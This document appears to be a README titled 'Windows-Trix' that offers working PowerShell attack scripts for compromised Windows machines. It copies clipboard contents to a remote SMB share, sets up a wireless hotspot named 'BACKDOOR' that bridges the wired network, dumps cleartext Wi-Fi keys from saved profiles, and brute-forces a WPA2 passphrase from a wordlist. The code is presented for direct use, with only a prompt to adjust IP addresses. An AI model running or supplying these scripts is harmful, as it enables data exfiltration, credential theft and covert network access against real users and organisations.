# Windows-Trix
An assortment of techniques that can be used to exploit Windows.  Most of these assume that you have or can attain administrator or system privileges on the endpoint.  You will need to change IP addresses and other references in the examples to fit your environment.

## Copying data from the clipboard using powershell

```powershell
Add-Type -AssemblyName System.Windows.Forms

if($([System.Windows.Forms.Clipboard]::ContainsImage()))
{
   $cb = [System.Windows.Forms.Clipboard]::GetImage()
   $file = '\\10.192.103.49\smbdata\clipboard.png'
   $cb.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
}
else
{
   if($([System.Windows.Forms.Clipboard]::ContainsText()))
   {
      $cb = [System.Windows.Forms.Clipboard]::GetText()
      $file = '\\10.192.103.49\smbdata\clipboard.txt'
      $cb > $file
   }
   else
   {
      Write-Output "Nothing in clipboard to save."
   }
}
```

## Configuring a backdoor hotspot using powershell

**Activation script** `wifi-start.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll

$ssid = "BACKDOOR"
$wpsk = "1234567890"

$hsup = netsh wlan show drivers | Select-String "Hosted network supported" | Select-String "Yes"
if(!$hsup)
{
   Write-Host "Wireless host mode not supported."
   Exit
}
$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String "Started"
if($huse)
{
   Write-Host "Wireless host mode already in use."
   Exit
}
$wuse = netsh wlan show interfaces | Select-String "State" | Select-String "disconnected"
if(!$wuse)
{
   Write-Host "Wireless interface already in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq  'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$hcfg = netsh wlan set hostednetwork mode=allow ssid="$ssid" key="$wpsk" | Select-String "successfully changed"
if(!$hcfg)
{
   Write-Host "Wireless host mode could not be configured."
   Exit
}
$hact = netsh wlan start hostednetwork | Select-String "hosted network started"
if(!$hact)
{
   Write-Host "Wireless host mode could not be activated."
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -eq 'Microsoft Hosted Network Virtual Adapter'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
if($cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS ethernet interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$cfgpri.EnableSharing(1)
$cfgpub.EnableSharing(0)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot configured successfully."
   Exit
}
else
{
   Write-Host "ICS wireless hotspot setup failed."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
```

**Deactivation script** `wifi-stop.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll

$ssid = "BACKDOOR"

$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String "Started"
if(!$huse)
{
   Write-Host "Wireless host mode not in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq  'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -eq 'Microsoft Hosted Network Virtual Adapter'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot deactivated."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
else
{
   Write-Host "Active ICS hotspot not detected."
   Exit
}
```

## Retrieving wireless profile passwords using powershell

```powershell
$wp = @()
(((netsh wlan show profiles) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*All user profile*')
   {
      $t = $_.Split(":")
      $wp += $t[1].trim()
   }
})
Write-Host "SSID -> PSK"
Write-Host "-----------------------------------------"
$wp.foreach({
   $id = $_
   (((netsh wlan show profile "$id" key=clear) | Out-String).Split("`r`n")).ForEach({
   if($_ -Like '*Key content*')
   {
      $pw = ($_.Split(":"))[1].trim()
      Write-Host "$id -> $pw"
   }
})})
```

## View wireless networks and signal strength using netsh

```netsh wlan show networks mode=bssid```

## Slow on-line brute-force wireless password in powershell

```powershell
$ssid = "iPhone"
$wordlist = @("password",
              "secretkey!",
              "wifiaccess",
              "wifipassword",
              "1234567890",
              "Pa55w0rd")
$xmlfile = "C:\windows\temp\BruteForce.xml"
$pxml = @'
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
   <name>BruteForce</name>
   <SSIDConfig>
      <SSID>
         <hex>------</hex>
         <name>------</name>
      </SSID>
   </SSIDConfig>
   <connectionType>ESS</connectionType>
   <connectionMode>auto</connectionMode>
   <MSM>
      <security>
         <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
         </authEncryption>
         <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>------</keyMaterial>
         </sharedKey>
      </security>
   </MSM>
</WLANProfile>
'@
$ssidhex = ""
$ssid.ToCharArray() | foreach-object -process {$ssidhex += '{0:X}' -f [int][char]$_}
(((netsh wlan show interfaces) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*Name*')
   {
      $t = $_.Split(":")
      $wlan = $t[1].trim()
   }
})
if($wlan -eq $null)
{
   Write-Host "Could not identify the wireless adapter."
   Exit
}
foreach($key in $wordlist)
{
   if(Test-Path $xmlfile) {Remove-Item -Path "$xmlfile" -Force}
   ForEach($line in $($pxml -split "`r`n"))
   {
      $line = $line -Replace [regex]::Escape("<hex>------</hex>"),"<hex>$ssidhex</hex>"
      $line = $line -Replace [regex]::Escape("<name>------</name>"),"<name>$ssid</name>"
      $line = $line -Replace [regex]::Escape("<keyMaterial>------</keyMaterial>"),"<keyMaterial>$key</keyMaterial>"
      $line | Out-File "$xmlfile"
   }
   netsh wlan add profile filename="$xmlfile" | Out-Null
   netsh wlan connect name="BruteForce" interface="$wlan" | Out-Null
   Start-Sleep -s 4
   $state = ""
   (((netsh wlan show interfaces interface="$wlan") | out-string ).split("`r`n")).ForEach({
      if($_ -Like '*State*')
      {
         $t = $_.Split(":")
         $state = $t[1].trim()
      }
   })
   if($state -eq "connected")
   {
      Write-Host "Wireless PSK -> $key"
      netsh wlan delete profile name="BruteForce" | Out-Null
      Exit
   }
   netsh wlan delete profile name="BruteForce" | Out-Null
}
```
